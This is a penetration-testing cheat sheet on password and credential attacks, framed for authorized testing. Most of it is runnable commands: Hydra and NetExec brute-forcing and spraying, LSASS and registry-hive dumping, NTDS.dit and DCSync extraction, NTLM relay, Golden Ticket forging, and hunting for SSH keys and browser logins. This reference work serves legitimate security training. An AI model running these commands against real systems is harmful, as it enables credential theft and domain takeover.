---
title: "Password Attacks & Brute Forcing"
description: "Online/offline password attacks: Hydra/Medusa service brute-forcing, spraying, mutations and defaults."
category: password-attacks
tags: [password-attacks, brute-force, spraying]
tools: [Hydra, Medusa, CrackMapExec]
difficulty: intermediate
updated: "2026-08-09"
source: "repo:Password-Attacks/Password_Attacks_Cheat_Sheet.pdf"
---

# Password Attacks & Brute Forcing

A comprehensive reference for password attack methodologies in authorized penetration testing: connecting to targets, building wordlists, remote and local credential attacks, hash cracking, and advanced Active Directory techniques.

> **Note — Impacket packaging.** Modern Impacket installs its example scripts with an `impacket-` prefix (`impacket-secretsdump`, `impacket-GetUserSPNs`, `impacket-GetNPUsers`, `impacket-ntlmrelayx`, `impacket-smbserver`, `impacket-psexec`, `impacket-getST`, `impacket-findDelegation`). The `python3 <script>.py` forms below still work from a source checkout.

## Key Concepts

| Attack | Description |
| --- | --- |
| Brute force | Systematically trying all possible password combinations |
| Dictionary | Using wordlists of common passwords |
| Credential stuffing | Reusing compromised credentials across services |
| Pass-the-Hash | Using password hashes without cracking them |
| Password spraying | Trying common passwords against many accounts |
| Hash cracking | Converting password hashes back to plaintext |

### Tools Overview

| Tool | Primary Use |
| --- | --- |
| Hydra | Network protocol brute-forcing |
| NetExec | Windows network authentication testing (formerly CrackMapExec) |
| Hashcat | GPU-accelerated hash cracking |
| John the Ripper | CPU-based hash cracking |
| Mimikatz | Windows credential extraction |
| Pypykatz | Python-based LSASS parsing |

## 1. Connecting to Target

```bash
# RDP (xfreerdp)
xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!

# WinRM (Evil-WinRM) — supports pass-the-hash, PowerShell session
evil-winrm -i <ip> -u user -p password

# SSH
ssh user@<ip>

# SMB share (smbclient)
smbclient -U user \\\\<ip>\\SHARENAME

# Host an SMB share on the attack host (file transfer)
python3 smbserver.py -smb2support CompData /home/<user>/Documents/

# SSH SOCKS proxy for pivoting
ssh -D 9050 user@<ip>
proxychains xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!
```

## 2. Password Mutations & Custom Wordlists

```bash
# CeWL — scrape a website for keywords (-d depth, -m min length, --lowercase, -w output)
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Hashcat rule-based mutations (append numbers, capitalize, leetspeak, specials)
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Username-Anarchy — generate username permutations from first/last names
./username-anarchy -i /path/to/listoffirstandlastnames.txt

# Build a compressed-file-extension list for file hunting
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

Common mutation rules: append numbers (`password` -> `password123`), capitalize first letter, leetspeak (`password` -> `p@ssw0rd`), append specials (`password!`), reverse (`drowssap`).

Generated username formats: `john.smith`, `j.smith`, `johns`, `john_smith`, `smithj`, `jsmith`.

> **Critical — tailor wordlists to the target.** Include company name/variations, product and service names, locations, industry terminology, common patterns (`Summer2024!`, `Welcome123`), OSINT employee names, and (when legally authorized) historical breach data. Generic wordlists have far lower success rates.

## 3. Remote Password Attacks

### NetExec (formerly CrackMapExec)

```bash
# WinRM brute force
netexec winrm <ip> -u user.list -p password.list

# SMB share enumeration with creds
netexec smb <ip> -u "user" -p "password" --shares

# Dump SAM (requires admin)
netexec smb <ip> --local-auth -u <username> -p <password> --sam

# Dump LSA secrets (may contain cleartext creds / service passwords)
netexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Dump NTDS.dit (Domain Controller only — full domain compromise)
netexec smb <ip> -u <username> -p <password> --ntds
```

### Hydra — Multi-Protocol Brute Forcing

```bash
# Username + password lists
hydra -L user.list -P password.list <service>://<ip>

# Single username, password list
hydra -l username -P password.list <service>://<ip>

# Single password, user list (spraying)
hydra -L user.list -p password <service>://<ip>

# Credential stuffing (user:pass pairs per line)
hydra -C <user_pass.list> ssh://<IP>
```

Supported services/ports: SSH (22), FTP (21), HTTP/HTTPS (80/443), SMB (445), RDP (3389), MySQL (3306), PostgreSQL (5432), MSSQL (1433), and many more.

### Pass-the-Hash & Network Credential Extraction

```bash
# Pass-the-Hash with Evil-WinRM (NTLM hash instead of password)
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"

# Extract credentials from a packet capture
./Pcredz -f demo.pcapng -t -v
```

Pass-the-Hash requirements: an NTLM hash (from SAM, NTDS, or memory dump), a target that accepts NTLM authentication, administrative privileges (recommended), and network connectivity.

## 4. Windows Local Password Attacks

### Process Enumeration & LSASS Dumping

```powershell
# List processes and services
tasklist /svc

# Identify the LSASS process (note the PID)
Get-Process lsass

# Dump LSASS memory with comsvcs.dll (replace 672 with the LSASS PID; admin/SYSTEM)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Parse the dump offline with Pypykatz
pypykatz lsa minidump /path/to/lsassdumpfile
```

### Registry Hive Extraction

```powershell
# Save SAM, SECURITY, SYSTEM hives (admin)
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\security C:\security.save
reg.exe save hklm\system C:\system.save

# Move to a network share
move sam.save \\<ip>\NameofFileShare
move security.save \\<ip>\NameofFileShare
move system.save \\<ip>\NameofFileShare
```

```bash
# Extract hashes from the saved hives (Impacket)
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### NTDS.dit Extraction (Domain Controller)

```powershell
# Create a volume shadow copy (Domain Admin or equivalent)
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.dit from the shadow copy (replace the shadow identifier from vssadmin output)
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
# Also extract the SYSTEM hive for the decryption keys.
```

### Credential Manager

```powershell
# Open the Credential Manager GUI
rundll32 keymgr.dll,KRShowKeyMgr

# List saved credentials in the current profile
cmdkey /list

# Launch cmd.exe as a stored user (works if creds saved with /savecred — no password needed)
runas /savecred /user:<username> cmd
```

### File & Share Hunting

```powershell
# Search files for the string "password"
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Snaffler — search network shares for sensitive files/creds
snaffler.exe -s

# PowerShell share hunting
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

### Key Windows Credential Locations

| Location | Contains | Privileges |
| --- | --- | --- |
| LSASS Memory | NTLM hashes, cleartext passwords, Kerberos tickets | Admin |
| SAM Registry | Local user NTLM hashes | Admin |
| LSA Secrets | Service account passwords, cached credentials | Admin |
| NTDS.dit | All domain user password hashes | Domain Admin |
| Credential Manager | Stored credentials for various services | User/Admin |

## 5. Linux Local Password Attacks

### Configuration, Database & Document Hunting

```bash
# Find configuration files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Search config files for credentials (skip commented lines)
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# Find database files
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# Text / script / document files
find /home/* -type f -name "*.txt" -o ! -name "*.*"
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### Cron, SSH Keys, Bash History

```bash
cat /etc/crontab
ls -la /etc/cron.*/

# SSH keys system-wide / in home dirs / public keys
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

# Bash history
tail -n5 /home/*/.bash*
```

### Memory & Browser Credential Extraction

```bash
# Mimipenguin — plaintext creds from memory
python3 mimipenguin.py
bash mimipenguin.sh

# LaZagne — recover creds from browsers, email clients, databases
python2.7 lazagne.py all
python3 lazagne.py browsers

# Firefox stored credentials
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bp1pd86.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

### Key Linux Credential Locations

| Location | Contents | Risk |
| --- | --- | --- |
| `/etc/shadow` | Hashed user passwords (SHA-512, MD5) | Critical |
| `~/.ssh/` | SSH private keys | Critical |
| `~/.bash_history` | Command history with credentials | High |
| `*.conf`, `*.config` | Application credentials | High |
| `~/.mozilla` | Firefox stored passwords | Medium |
| `/var/log/` | Log files with authentication data | Medium |
| `*.py`, `*.sh` | Scripts with hardcoded credentials | High |

## 6. Cracking Passwords

### Hash Identification

Common formats: MD5 (32 hex), NTLM (32 hex, same length as MD5), SHA-1 (40 hex), SHA-256 (64 hex), bcrypt (starts `$2a$`/`$2b$`/`$2y$`), SHA-512 Unix (starts `$6$`).

### Impacket Secretsdump

```bash
# Local registry hives (SYSTEM holds the boot key to decrypt SAM/SECURITY)
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Remote SAM over the network (admin creds; no disk touch)
python3 secretsdump.py 'DOMAIN/user:password@<target-ip>'

# NTDS.dit remotely from a DC (all domain hashes — Domain Admin)
python3 secretsdump.py 'DOMAIN/Administrator:password@<dc-ip>' -just-dc

# Specific user only (e.g. krbtgt for Golden Ticket)
python3 secretsdump.py 'DOMAIN/Administrator:password@<dc-ip>' -just-dc-user krbtgt

# Pass-the-Hash (LM:NTLM, or leave LM empty with a leading colon)
python3 secretsdump.py 'DOMAIN/Administrator@<target-ip>' -hashes :aad3b435b51404eeaad3b435b51404ee

# Offline NTDS.dit (requires the SYSTEM hive too)
python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# Save output to files (hashes.ntds, hashes.ntds.kerberos, hashes.ntds.cleartext)
python3 secretsdump.py 'DOMAIN/user:password@<target>' -just-dc -outputfile hashes
```

| Option | Description |
| --- | --- |
| `-just-dc` | Extract NTDS.dit only (skip SAM/LSA) |
| `-just-dc-ntlm` | Extract only NTLM hashes, skip Kerberos |
| `-just-dc-user USERNAME` | Extract a specific user only |
| `-history` | Include password history hashes |
| `-user-status` | Show if an account is enabled/disabled |
| `-pwd-last-set` | Show password-last-set timestamp |
| `-exec-method METHOD` | Use smbexec, wmiexec, or mmcexec |
| `-use-vss` | Use Volume Shadow Copy for extraction |

### Hashcat — GPU-Accelerated Cracking

```bash
# NTLM (mode 1000) with wordlist
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt

# Show the cracked plaintext for a hash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Linux shadow (SHA-512, mode 1800) — combine passwd + shadow first
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# MD5 (mode 500 = md5crypt)
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

# BitLocker (mode 22100)
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```

| Mode | Hash Type | Notes |
| --- | --- | --- |
| 0 | MD5 | Extremely fast, weak |
| 100 | SHA-1 | Fast, deprecated |
| 1000 | NTLM | Windows password hashes |
| 1800 | SHA-512 (Unix) | Linux `/etc/shadow` |
| 3200 | bcrypt | Modern, intentionally slow |
| 5600 | NetNTLMv2 | Network authentication captures |
| 13100 | Kerberos TGS | Kerberoasting |
| 22000 | WPA/WPA2 | WiFi cracking |
| 22100 | BitLocker | Full disk encryption |

Attack modes: `-a 0` straight (dictionary), `-a 1` combination, `-a 3` brute-force/mask, `-a 6` hybrid wordlist+mask, `-a 7` hybrid mask+wordlist.

### John the Ripper — File & Hash Cracking

```bash
# SSH private key
python3 ssh2john.py SSH.private > ssh.hash
john ssh.hash --show

# Microsoft Office document
office2john.py Protected.docx > protecteddocx.hash
john --wordlist=rockyou.txt protecteddocx.hash

# PDF
pdf2john.pl PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

# ZIP archive
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# BitLocker volume (from VHD)
bitlocker2john -i Backup.vhd > backup.hashes
```

### OpenSSL-Encrypted Archive

```bash
file GZIP.gzip     # identify the file type
# Brute force an OpenSSL-encrypted archive with a wordlist
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
```

> **Tip — cracking strategy.** 1) Start with common passwords (top 10k). 2) Apply rule-based mutations. 3) Use targeted, organization-specific wordlists. 4) Try hybrid attacks (wordlist + masks). 5) Reserve pure brute-force as a last resort. Relative crack speed (fastest first): MD5 > NTLM > SHA-1 > SHA-256 > SHA-512 > bcrypt.

Wordlist resources: `/usr/share/wordlists/rockyou.txt`, `/usr/share/seclists/`, `/usr/share/wordlists/`, plus custom lists from CeWL / username-anarchy / mutations.

## 7. Advanced Attack Techniques

### Kerberoasting

```bash
# Request TGS tickets for all SPNs
python3 GetUserSPNs.py DOMAIN/user:password -dc-ip <DC-IP> -request

# Save directly in hashcat format
python3 GetUserSPNs.py DOMAIN/user:password -dc-ip <DC-IP> -request -outputfile kerberoast.hash

# Crack (mode 13100 = RC4-HMAC / Kerberos 5 TGS-REP etype 23; faster than AES)
hashcat -m 13100 kerberoast.hash rockyou.txt
```

### AS-REP Roasting

```bash
# Target accounts with "Do not require Kerberos preauthentication"
python3 GetNPUsers.py DOMAIN/ -dc-ip <DC-IP> -usersfile users.txt -format hashcat -outputfile asrep.hash

# Crack (mode 18200)
hashcat -m 18200 asrep.hash rockyou.txt
```

> **Warning —** AS-REP Roasting does not require valid credentials; vulnerable accounts can be enumerated without authentication if LDAP allows anonymous binds.

### Password Spraying

> **Critical — account lockout awareness.** Identify the lockout threshold (typically 3-5 attempts) and duration (typically 15-30 minutes), calculate safe spray intervals, and monitor for lockouts during testing.

```bash
# Smart spray across hosts (--continue-on-success tests all combos)
netexec smb targets.txt -u users.txt -p 'Password123!' --continue-on-success

# Time-based spray with delays between attempts
for pass in $(cat passwords.txt); do
    echo "[+] Trying password: $pass"
    netexec smb 10.10.10.10 -u users.txt -p "$pass"
    echo "[*] Sleeping 30 minutes to avoid lockout..."
    sleep 1800
done
```

### DCSync

```bash
# Mimikatz
mimikatz # lsadump::dcsync /domain:DOMAIN.COM /user:Administrator
mimikatz # lsadump::dcsync /domain:DOMAIN.COM /all

# Impacket
python3 secretsdump.py DOMAIN/user:password@DC-IP -just-dc
```

> **Critical —** DCSync requires Replicating Directory Changes (and All) permissions — typically Domain Admins, Enterprise Admins, or accounts with specific delegation rights.

### Responder & NTLM Relay

```bash
# Poison LLMNR/NBT-NS to capture NetNTLMv2
sudo responder -I eth0 -wFv
hashcat -m 5600 captured.hash rockyou.txt

# Relay captured auth to a target (requires SMB signing disabled)
python3 ntlmrelayx.py -tf targets.txt -smb2support
python3 ntlmrelayx.py -t 10.10.10.10 -smb2support -c "whoami"
```

### Golden & Silver Tickets

```bash
# Golden Ticket (requires krbtgt hash; valid up to 10 years by default)
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /id:500 /ptt

# Silver Ticket (service account hash; stealthier, limited to one service)
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /target:SERVER.DOMAIN.COM /service:CIFS /rc4:<SERVICE_HASH> /ptt
```

### Pass-the-Ticket (PtT)

```bash
# Export / import tickets with Mimikatz
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi

# Use a ticket with Impacket
export KRB5CCNAME=/path/to/ticket.ccache
python3 psexec.py -k -no-pass DOMAIN/user@target.domain.com
```

### Constrained Delegation Abuse

```bash
python3 findDelegation.py DOMAIN/user:password -dc-ip DC-IP
python3 getST.py -spn CIFS/target.domain.com -impersonate Administrator DOMAIN/service_account:password
```

### Credential Guard Bypass

```powershell
# ProcDump may still dump protected LSASS (often needs system-level access)
procdump64.exe -ma lsass.exe lsass.dmp
```

> **Note — Protected Users group restrictions:** no NTLM authentication, no DES/RC4 in Kerberos pre-auth, no credential delegation, TGT lifetime limited to 4 hours, cannot authenticate with unconstrained delegation.

### Advanced Attack Tool Reference

| Tool | Purpose | Type |
| --- | --- | --- |
| GetUserSPNs.py | Kerberoasting — extract service tickets | Impacket |
| GetNPUsers.py | AS-REP Roasting — extract vulnerable hashes | Impacket |
| Responder | LLMNR/NBT-NS poisoning | Python |
| ntlmrelayx.py | NTLM credential relaying | Impacket |
| Mimikatz | Credential extraction, ticket manipulation | Windows |
| Rubeus | Kerberos abuse and ticket manipulation | C# |
| BloodHound | Active Directory attack path visualization | Neo4j |
| findDelegation.py | Identify delegation vulnerabilities | Impacket |

> **Detection —** activities likely to trigger alerts: excessive Kerberos ticket requests (Kerberoasting), AS-REP requests for multiple accounts, DCSync from non-DC systems, NTLM relay against disabled SMB signing, unusual PowerShell execution, abnormal LSASS access, lateral movement via Pass-the-Hash.

## 8. Quick Reference

### Tool Selection Matrix

| Target | Tool | Command |
| --- | --- | --- |
| SSH | Hydra | `hydra -L users -P pass.list ssh://IP` |
| RDP | Hydra | `hydra -L users -P pass.list rdp://IP` |
| WinRM | NetExec | `netexec winrm IP -u users -p pass.list` |
| SMB | NetExec | `netexec smb IP -u user -p pass.list` |
| FTP | Hydra | `hydra -l user -P pass.list ftp://IP` |
| HTTP | Hydra | `hydra -l user -P pass.list http-post-form://IP` |

### Common Default Credentials

| Service | Username | Password | Notes |
| --- | --- | --- | --- |
| MySQL | root | (empty) | Default on many installations |
| PostgreSQL | postgres | postgres | Common default |
| Tomcat | admin | admin | Default manager webapp |
| Jenkins | admin | password | Common initial setup |
| Admin panels | admin | admin | Generic web applications |
| Router | admin | password | Consumer routers |

### Port Reference

| Port | Service | Attack Vector |
| --- | --- | --- |
| 21 | FTP | Brute force, default credentials |
| 22 | SSH | Brute force, key-based attacks |
| 23 | Telnet | Brute force (cleartext) |
| 445 | SMB | Pass-the-Hash, credential stuffing |
| 3306 | MySQL | Brute force, default root account |
| 3389 | RDP | Brute force, credential stuffing |
| 5432 | PostgreSQL | Brute force, default postgres account |
| 5985/5986 | WinRM | Pass-the-Hash, password spray |
| 8080 | HTTP Alt | Web form attacks, default creds |

### CeWL Wordlist Generation

```bash
cewl https://example.com -w wordlist.txt                       # basic scraping
cewl https://example.com -d 5 -m 6 -w wordlist.txt             # deep crawl, min length 6
cewl https://example.com -e --email_file emails.txt            # include email addresses
cewl https://example.com -o --meta -w wordlist.txt             # follow external links + metadata
```

### Password Complexity Patterns

Common patterns to include in wordlists: Season+Year (`Summer2024!`, `Winter2023!`), Company+Year (`Inlanefreight2024!`), Welcome+Number (`Welcome123!`, `Welcome2024`), Location+Special (`NewYork!`, `California123`), Password+Special (`Password1!`, `P@ssw0rd!`), Month+Year (`January2024`, `March2023!`).

### Essential Command Cheat Sheet

```bash
# NetExec
netexec smb 192.168.1.0/24 -u users.txt -p 'Password123!'      # password spray
netexec smb 10.10.10.10 -u admin -p pass --sam                 # dump SAM
netexec smb dc.domain.com -u admin -p pass --ntds              # dump NTDS (DC)
netexec smb 10.10.10.10 -u admin -H <NTLM_HASH>                # pass-the-hash

# Hydra
hydra -L users.txt -P pass.txt ssh://10.10.10.10
hydra -l admin -P pass.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l administrator -P pass.txt rdp://10.10.10.10
hydra -L users.txt -p Password123 ftp://10.10.10.10

# Hashcat
hashcat -m 1000 hashes.txt rockyou.txt
hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule
hashcat -m 1800 shadow.txt rockyou.txt
hashcat -m 1000 hashes.txt --show

# Impacket secretsdump
secretsdump.py -sam sam -security security -system system LOCAL
secretsdump.py 'DOMAIN/user:pass@10.10.10.10'
secretsdump.py 'DOMAIN/admin:pass@dc.domain.com' -just-dc
secretsdump.py 'DOMAIN/admin@10.10.10.10' -hashes :NTLM_HASH
```
